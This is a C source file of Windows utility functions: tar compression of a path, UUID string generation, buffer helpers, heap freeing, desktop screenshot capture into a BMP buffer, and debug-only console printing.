BOOL CompressPathByGzip
(
	_In_ LPWSTR lpPath,
	_In_ LPWSTR lpOutputPath
)
{
	LPWSTR Args[] = { L"tar", L"-czf", NULL, L"-C", NULL, NULL};
	LPWSTR lpName = NULL;
	BOOL Result = FALSE;
	LPWSTR lpFullPath = NULL;
	HANDLE hProcess = NULL;

	lpFullPath = GetFullPathW(lpPath);
	if (lpFullPath == NULL) {
		goto CLEANUP;
	}

	lpName = PathFindFileNameW(lpFullPath);
	lpName[-1] = L'\0';
	Args[2] = lpOutputPath;
	Args[4] = lpFullPath;
	Args[5] = lpName;
	if (!Run(Args, _countof(Args), &hProcess)) {
		goto CLEANUP;
	}

	WaitForSingleObject(hProcess, INFINITE);
	Result = TRUE;
CLEANUP:
	FREE(lpFullPath);
	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}

	return Result;
}

LPSTR GenerateUUIDv4(VOID)
{
	RPC_STATUS Status = RPC_S_OK;
	UUID pUuid;
	WCHAR wszUuid[0x100];
	LPSTR lpResult = NULL;

	Status = UuidCreateSequential(&pUuid);
	StringFromGUID2(&pUuid, wszUuid, _countof(wszUuid));
	lpResult = ConvertWcharToChar(&wszUuid[1]);
	lpResult[lstrlenA(lpResult) - 1] = '\0';
	lpResult[14] = '4';
	lpResult[19] = '8';

	return lpResult;
}

PBUFFER BufferInit
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
)
{
	PBUFFER pResult = NULL;

	pResult = ALLOC(sizeof(BUFFER));
	pResult->pBuffer = ALLOC(cbBuffer + 1);
	memcpy(pResult->pBuffer, pBuffer, cbBuffer);
	pResult->cbBuffer = cbBuffer;
	return pResult;
}

PBUFFER BufferMove
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
)
{
	PBUFFER pResult = NULL;

	pResult = ALLOC(sizeof(BUFFER));
	pResult->pBuffer = pBuffer;
	pResult->cbBuffer = cbBuffer;
	return pResult;
}

PBUFFER BufferEmpty
(
	_In_ DWORD cbBuffer
)
{
	PBUFFER pResult = NULL;

	pResult = ALLOC(sizeof(BUFFER));
	pResult->pBuffer = ALLOC(cbBuffer + 1);
	pResult->cbBuffer = cbBuffer;
	return pResult;
}

VOID FreeAllocatedHeap
(
	_In_ LPVOID lpBuffer
)
{
	if (lpBuffer != NULL) {
		RtlFreeHeap(GetProcessHeap(), 0, lpBuffer);
	}
}

PBUFFER CaptureDesktop
(
	_In_ HDC hDC,
	_In_ DWORD dwX,
	_In_ DWORD dwY
)
{
	HDC hMemDC = NULL;
	BITMAP ScreenBitmap;
	HBITMAP hBitmap = NULL;
	BITMAPFILEHEADER BmpFileHdr;
	BITMAPINFOHEADER BmpInfoHdr;
	DWORD dwBmpSize = 0;
	PBUFFER pResult = NULL;
	PBYTE pBitmapBuffer = NULL;
	DWORD cbDIB = 0;
	DWORD dwScreenWidth = 0;
	DWORD dwScreenHeight = 0;

	SecureZeroMemory(&ScreenBitmap, sizeof(ScreenBitmap));
	SecureZeroMemory(&BmpFileHdr, sizeof(BmpFileHdr));
	SecureZeroMemory(&BmpInfoHdr, sizeof(BmpInfoHdr));
	hMemDC = CreateCompatibleDC(hDC);
	if (hMemDC == NULL) {
		LOG_ERROR("CreateCompatibleDC", GetLastError());
		goto CLEANUP;
	}

	SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
	dwScreenWidth = GetDeviceCaps(hDC, HORZRES);
	dwScreenHeight = GetDeviceCaps(hDC, VERTRES);
	/*PrintFormatA("dwScreenWidth: %d\n", dwScreenWidth);
	PrintFormatA("dwScreenHeight: %d\n", dwScreenHeight);*/
	hBitmap = CreateCompatibleBitmap(hDC, dwScreenWidth, dwScreenHeight);
	if (hBitmap == NULL) {
		LOG_ERROR("CreateCompatibleBitmap", GetLastError());
		goto CLEANUP;
	}

	SelectObject(hMemDC, hBitmap);
	if (!BitBlt(hMemDC, 0, 0, dwScreenWidth, dwScreenHeight, hDC, dwX, dwY, SRCCOPY | CAPTUREBLT)) {
		LOG_ERROR("BitBlt", GetLastError());
		goto CLEANUP;
	}

	GetObjectW(hBitmap, sizeof(BITMAP), &ScreenBitmap);
	BmpInfoHdr.biSize = sizeof(BITMAPINFOHEADER);
	BmpInfoHdr.biWidth = ScreenBitmap.bmWidth;
	BmpInfoHdr.biHeight = ScreenBitmap.bmHeight;
	BmpInfoHdr.biPlanes = 1;
	BmpInfoHdr.biBitCount = 32;
	BmpInfoHdr.biCompression = BI_RGB;
	BmpInfoHdr.biSizeImage = 0;
	BmpInfoHdr.biXPelsPerMeter = 0;
	BmpInfoHdr.biYPelsPerMeter = 0;
	BmpInfoHdr.biClrUsed = 0;
	BmpInfoHdr.biClrImportant = 0;
	dwBmpSize = ((ScreenBitmap.bmWidth * BmpInfoHdr.biBitCount + 31) / 32) * 4 * ScreenBitmap.bmHeight;
	pBitmapBuffer = ALLOC(dwBmpSize);
	if (GetDIBits(hDC, hBitmap, 0, ScreenBitmap.bmHeight, pBitmapBuffer, (PBITMAPINFO)&BmpInfoHdr, DIB_RGB_COLORS) == 0) {
		LOG_ERROR("GetDIBits", GetLastError());
		goto CLEANUP;
	}

	cbDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	BmpFileHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	BmpFileHdr.bfSize = cbDIB;
	BmpFileHdr.bfType = 0x4D42;

	pResult = BufferEmpty(sizeof(BmpFileHdr) + sizeof(BmpInfoHdr) + dwBmpSize);
	memcpy(pResult->pBuffer, &BmpFileHdr, sizeof(BmpFileHdr));
	memcpy(&pResult->pBuffer[sizeof(BmpFileHdr)], &BmpInfoHdr, sizeof(BmpInfoHdr));
	memcpy(&pResult->pBuffer[sizeof(BmpFileHdr) + sizeof(BmpInfoHdr)], pBitmapBuffer, dwBmpSize);
CLEANUP:
	FREE(pBitmapBuffer);
	if (hBitmap != NULL) {
		DeleteObject(hBitmap);
	}

	if (hMemDC != NULL) {
		DeleteDC(hMemDC);
	}

	/*if (hDC != NULL) {
		ReleaseDC(hWnd, hDC);
	}*/

	return pResult;
}

VOID PrintFormatA
(
	_In_ LPSTR lpFormat,
	...
)
{
#ifdef _DEBUG
	va_list Args;
	CHAR szBuffer[0x800];
	DWORD dwNumberOfCharsWritten = 0;

	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	va_start(Args, lpFormat);
	wvsprintfA(szBuffer, lpFormat, Args);
	WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), szBuffer, lstrlenA(szBuffer), &dwNumberOfCharsWritten, NULL);
	va_end(Args);
#endif
}


VOID PrintFormatW
(
	_In_ LPWSTR lpFormat,
	...
)
{
#ifdef _DEBUG
	va_list Args;
	WCHAR wszBuffer[0x800];
	DWORD dwNumberOfCharsWritten = 0;

	RtlSecureZeroMemory(wszBuffer, sizeof(wszBuffer));
	va_start(Args, lpFormat);
	wvsprintfW(wszBuffer, lpFormat, Args);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), wszBuffer, lstrlenW(wszBuffer), &dwNumberOfCharsWritten, NULL);
	va_end(Args);
#endif
}